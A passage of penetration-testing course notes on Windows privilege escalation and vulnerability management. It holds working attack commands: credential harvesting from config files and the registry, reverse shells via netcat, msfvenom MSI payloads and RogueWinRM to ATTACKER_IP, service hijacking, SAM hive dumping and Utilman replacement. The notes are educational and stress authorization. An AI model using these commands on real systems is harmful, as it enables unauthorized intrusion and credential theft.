**Controls required actions** to create consistent shadow copy (snapshot) of data.

**Stored in:** `System Volume Information` folder on each drive with protection enabled

**If VSS enabled (System Protection on):**
- Create restore point
- Perform system restore
- Configure restore settings
- Delete restore points

**Note:** Malware coders know this and may delete shadow copies to ensure ransomware success.

**Recommendation:** Offline/off-site backups are better.

---

### Windows Special Accounts
#windows-accounts

#### SYSTEM / Local System
- Account used by OS to perform internal tasks
- Full access to all files and resources
- Higher privileges than Administrator

#### Local Service
- Default account to run Windows services
- "Minimum" privileges
- Uses anonymous connections over network

#### Network Service
- Similar to Local Service
- Uses computer credentials to authenticate over network

**Note:** These are built-in accounts managed by Windows. You won't be able to use them as regular accounts, but in certain situations, you can leverage them.

---

### Harvesting Credentials
#credential-harvesting

#### 1. Unattended Windows Installations
#unattended-installs

**Windows Deployment Services** - Deploy single OS image to multiple hosts.

**Requires admin account** which might be stored in:

```cmd
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

#### 2. PowerShell History
#powershell-history

```powershell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

# Or
Get-Content (Get-PSReadlineOption).HistorySavePath
```

#### 3. Saved Windows Credentials
#saved-credentials

```cmd
cmdkey /list                         # List saved credentials
runas /savecred /user:admin cmd.exe  # Run as saved user
```

#### 4. IIS Configuration Files
#iis-config

**IIS** = Internet Information Services (default Windows web server)

**Configuration stored in:** `web.config`

**Can contain:**
- Database passwords
- Authentication credentials

**Locations (depending on IIS version):**
```cmd
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```

#### 5. Retrieve Credentials from PuTTY
#putty-credentials

PuTTY is SSH client on Windows.

**Users can store sessions** including:
- IP address
- Username
- Other configurations

**Passwords not stored** but **proxy configurations** are (including clear text authentication credentials).

**Retrieve proxy passwords:**
```cmd
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

---

### Scheduled Tasks
#scheduled-tasks

**View scheduled tasks:**
```cmd
schtasks                             # List scheduled tasks
schtasks /query /tn TASKNAME /fo list /v  # Detailed info about task
```

**Key information:**
- **Task To Run** - What executable/script is run
- **Run As User** - Which user executes the task

**If current user can modify/overwrite executable:**
- Can control what gets executed by "Run As User"

**Check file permissions:**
```cmd
icacls C:\tasks\script.bat
```

**If modifiable, replace with reverse shell:**
```cmd
echo C:\path\to\nc.exe -e cmd.exe ATTACKER_IP PORT > C:\tasks\script.bat
```

**Force run task:**
```cmd
schtasks /run /tn TASKNAME
```

---

### Windows Installer Files (.msi)
#msi-files #always-install-elevated

**MSI files** install applications on system.

**Usually run with** privilege level of user starting it.

**Can be configured** to run with higher privileges from any user account.

**Check registry values:**
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**If both set to 1:**
- Can generate malicious MSI that runs with admin rights

**Create malicious MSI with msfvenom:**
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f msi -o malicious.msi
```

**Setup Metasploit handler:**
```bash
use multi/handler
set payload windows/x64/shell_reverse_tcp
set LHOST ATTACKER_IP
set LPORT 443
exploit -j
```

**On target, execute:**
```cmd
msiexec /quiet /qn /i C:\path\to\malicious.msi
```

---

### Windows Services
#windows-services

**Managed by Service Control Manager (SCM):**
- In charge of managing service state
- Checking status of services
- Provides way to configure services

**Each service has:**
- Associated executable that SCM uses to start service
- Special functions to communicate with SCM
- Specified user account to run under

**Query service configuration:**
```cmd
sc qc ServiceName
```

**Key information:**
- **BINARY_PATH_NAME** - Executable associated with service
- **SERVICE_START_NAME** - User account that runs service

**Services have DACL** (Discretionary Access Control List):
- Indicates who has permission to start, stop, pause, etc.

**All service configurations stored in registry:**
```
HKLM\SYSTEM\CurrentControlSet\Services\
```

Each service has subkey with:
- **ImagePath** - Program to run when service starts
- **ObjectName** - User account service runs as

**If DACL configured:**
- Stored in `Security` subkey

**Only administrators can edit registry.**

**Service commands:**
```cmd
sc start ServiceName                 # Start service
sc stop ServiceName                  # Stop service
sc query ServiceName                 # Query service status
sc qc ServiceName                    # Query service configuration
```

---

### Service Exploits

#### 1. Unquoted Service Paths
#unquoted-service-paths

**When service points to unquoted executable path with spaces:**

Example:
```
C:\Program Files\My Service\service.exe
```

**Windows searches in this order:**
1. `C:\Program.exe`
2. `C:\Program Files\My.exe`
3. `C:\Program Files\My Service\service.exe`

**Exploitation:**
1. Find unquoted service path
```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

2. Check permissions on folders
```cmd
icacls "C:\Program Files\My Service"
```

3. If writable, place malicious executable in path
```cmd
copy malicious.exe "C:\Program Files\My.exe"
```

4. Restart service
```cmd
sc stop ServiceName
sc start ServiceName
```

**Note:** Most services installed under `C:\Program Files` or `C:\Program Files (x86)` which aren't writable by unprivileged users. Exception: Some installers change permissions making service vulnerable.

---

#### 2. Insecure Service Permissions
#insecure-service-permissions

**Even if service executable DACL is well configured:**
- Service DACL might allow configuration modification

**Check service permissions with AccessChk:**
```cmd
accesschk.exe -qlc ServiceName
```

**Look for:** `SERVICE_ALL_ACCESS` for `BUILTIN\Users`

**If found, reconfigure service to point to malicious executable:**
```cmd
sc config ServiceName binPath= "C:\path\to\malicious.exe"
sc stop ServiceName
sc start ServiceName
```

---

#### 3. Insecure Service Executables
#insecure-service-executables

**If service executable is writable:**
- Replace with malicious executable

**Check permissions:**
```cmd
icacls "C:\Path\To\Service.exe"
```

**If writable:**
1. Backup original
```cmd
copy "C:\Path\To\Service.exe" "C:\Path\To\Service.exe.bak"
```

2. Replace with malicious executable
```cmd
copy malicious.exe "C:\Path\To\Service.exe"
```

3. Restart service
```cmd
sc stop ServiceName
sc start ServiceName
```

---

### Dangerous Privileges
#dangerous-privileges

**Check assigned privileges:**
```cmd
whoami /priv
```

#### 1. SeBackup / SeRestore Privileges
#sebackup #serestore

**Allow users to:**
- Read any file in system (ignoring DACL)
- Write any file in system (ignoring DACL)

**Purpose:** Allow backups without admin rights

**Exploitation:**

**Copy SAM and SYSTEM registry hives:**
```cmd
reg save hklm\sam C:\temp\sam
reg save hklm\system C:\temp\system
```

**Transfer to attacker machine, then extract hashes:**
```bash
python3 secretsdump.py -sam sam -system system LOCAL
```

**Use Pass-the-Hash or crack with hashcat:**
```bash
hashcat -m 1000 hashes.txt rockyou.txt
```

---

#### 2. SeTakeOwnership Privilege
#setakeownership

**Allows user to take ownership of any object:**
- Files
- Registry keys
- Etc.

**Exploitation:**

**Take ownership of file:**
```cmd
takeown /f C:\Windows\System32\Utilman.exe
```

**Grant full permissions:**
```cmd
icacls C:\Windows\System32\Utilman.exe /grant username:F
```

**Replace file:**
```cmd
copy cmd.exe Utilman.exe
```

**Trigger at login screen:**
- Press Windows+U
- Opens command prompt as SYSTEM

---

#### 3. SeImpersonate / SeAssignPrimaryToken
#seimpersonate #rogue-winrm

**Allows process to impersonate other users.**

**Impersonation:**
- Spawn process/thread under security context of another user

**Example:** FTP service
- User X has impersonation privileges
- User Y logs into FTP
- User X can borrow User Y's token to access their files

**Exploitation:**

If you control a process with these privileges:
1. Spawn process that users connect to
2. Force privileged users to connect & authenticate
3. Impersonate them

**Accounts that typically have these privileges:**
- LOCAL SERVICE
- NETWORK SERVICE
- IIS APPPOOL\DefaultAppPool

**Exploit Tools:**

##### RoguePotato
##### PrintSpoofer
##### JuicyPotato

**Example with RogueWinRM:**

**How it works:**
- When unprivileged user starts BITS service
- Windows automatically creates connection to port 5985 using SYSTEM privileges
- Port 5985 = WinRM service (PowerShell remote access)

**Upload exploit to target, then:**
```cmd
RogueWinRM.exe -p C:\path\to\nc.exe -a "-e cmd.exe ATTACKER_IP PORT"
```

---

### Vulnerable Software
#vulnerable-software

**Enumerate installed software:**
```cmd
wmic product get name,version,vendor
```

**Or with PowerShell:**
```powershell
Get-WmiObject -Class Win32_Product | Select-Object -Property Name, Version
```

---

### Automated Enumeration Tools

#### 1. WinPEAS
#winpeas

Script to enumerate target system for privilege escalation paths.

**Download:**
```powershell
certutil -urlcache -f http://ATTACKER_IP/winPEASx64.exe winpeas.exe
```

**Run:**
```cmd
winpeas.exe
```

#### 2. PrivescCheck
#privesccheck

PowerShell script for common privilege escalation checks.

**Alternative to WinPEAS** - Doesn't execute binary file.

**May need to bypass execution policy:**
```powershell
Set-ExecutionPolicy Bypass -Scope process -Force
. .\PrivescCheck.ps1
Invoke-PrivescCheck
```

#### 3. WES-NG (Windows Exploit Suggester - Next Generation)
#wes-ng

**Runs on attacker machine** to avoid noise.

**Python script**

**Update database:**
```bash
wes.py --update
```

**On target machine:**
```cmd
systeminfo > systeminfo.txt
```

**Transfer to attacker machine, then:**
```bash
wes.py systeminfo.txt
```

#### 4. Metasploit Local Exploit Suggester
#msf-exploit-suggester

**With Meterpreter shell:**
```bash
use multi/recon/local_exploit_suggester
set SESSION 1
run
```

Lists vulnerabilities that may affect the system.

---

## Vulnerability Management

#vulnerability-management #vuln-assessment

### Overview

Process of evaluating, categorizing, and ultimately remediating threats faced by organizations.

**Reality:**
- Near impossible to prevent/patch/remedy every vulnerability
- More about addressing the most dangerous vulnerabilities
- Goal: Reduce risk/likelihood of attack

**Statistics:**
- Approximately 2% of vulnerabilities get exploited

---

### CVSS (Common Vulnerability Scoring System)
#cvss

Measures impact and risk to organization according to vulnerability.

**Score Range:** 0.0 - 10.0

**Severity Ratings:**
- **None:** 0.0
- **Low:** 0.1 - 3.9
- **Medium:** 4.0 - 6.9
- **High:** 7.0 - 8.9
- **Critical:** 9.0 - 10.0

**Note:**
- CVSS never designed to help prioritize vulnerabilities
- Designed to assign value of severity
- Heavily assessed on if exploit is available
- As of 2020, 20% of vulnerabilities have exploits

---

### VPR (Vulnerability Priority Rating)
#vpr

Developed by **Tenable**

**Framework designed to be risk-driven:**
- Vulnerabilities given score with heavy focus on **risk** vulnerability poses
- Includes **relevancy** of vulnerability
- If software not used by org, there's no risk
- VPR changes over time accordingly

**Score Range:** 0.0 - 10.0

**Severity Ratings:**
- **Low:** 0.0 - 3.9
- **Medium:** 4.0 - 6.9
- **High:** 7.0 - 8.9
- **Critical:** 9.0 - 10.0

**Advantages:**
- Modern framework
- Over 150 factors when calculating risk
- Risk-driven to prioritize
- Dynamic (changes with age)

**Disadvantages:**
- Not open-source
- Adopted as part of commercial platform (Tenable)
- Doesn't consider CIA (Confidentiality, Integrity, Availability) extensively like CVSS

---

### POC (Proof of Concept)
#poc

Technique demonstrating exploitation of a vulnerability.

**Purpose:**
- Verify vulnerability exists
- Show impact of exploitation
- Provide basis for remediation testing

---

### Vulnerability Scanners
#vulnerability-scanners

**Advantages:**
- Automated scans easy to configure
- Results can be shared easily
- Quick scans
- Can scan multiple targets
- Open-source solutions exist
- Cover wide range of vulnerabilities

**Disadvantages:**
- People rely too heavily on these tools
- Extremely loud with traffic and logging (exposes you to firewalls, IDS, etc.)
- Open-source tools are basic (paid versions have more features)
- Often don't find every vulnerability

---

### Manual Vulnerability Assessment
#manual-assessment

**Types of vulnerabilities found manually:**

1. **Misconfigurations** - Improperly configured systems/applications/services
2. **Broken Access Control** - Access to parts of application not supposed to access
3. **Insecure Deserialization** - Insecure processing of data sent across application
4. **Injection** - Through poor/non-existent input validation, malicious code can be injected

**Offline Exploit Database:**
```bash
searchsploit <search_term>
searchsploit -u                      # Update database
```

---

## Final Notes

**Penetration Testing Junior - 100% Complete**

This comprehensive knowledge base covers:
- Web application vulnerabilities (Command Injection, SQL Injection)
- Web testing tools (Burp Suite)
- Reconnaissance techniques (Passive & Active)
- Port scanning and service enumeration (NMAP)
- Network protocols and services
- Shell access and stabilization
- Exploitation frameworks (Metasploit)
- Privilege escalation (Linux & Windows)
- Vulnerability assessment and management

**Remember:**
- Always have proper authorization before testing
- Enumeration is key at every stage
- Document your findings
- Understand the tools, don't just run them
- Practice in legal environments (CTFs, labs, authorized penetration tests)

---

## Additional Resources

- TryHackMe
- HackTheBox
- VulnHub
- PortSwigger Web Security Academy
- GTFOBins (https://gtfobins.github.io/)
- LOLBAS (Living Off The Land Binaries and Scripts)
- Exploit Database (https://www.exploit-db.com/)
- National Vulnerability Database (https://nvd.nist.gov/)

---

#pentesting-complete #cybersecurity #ethical-hacking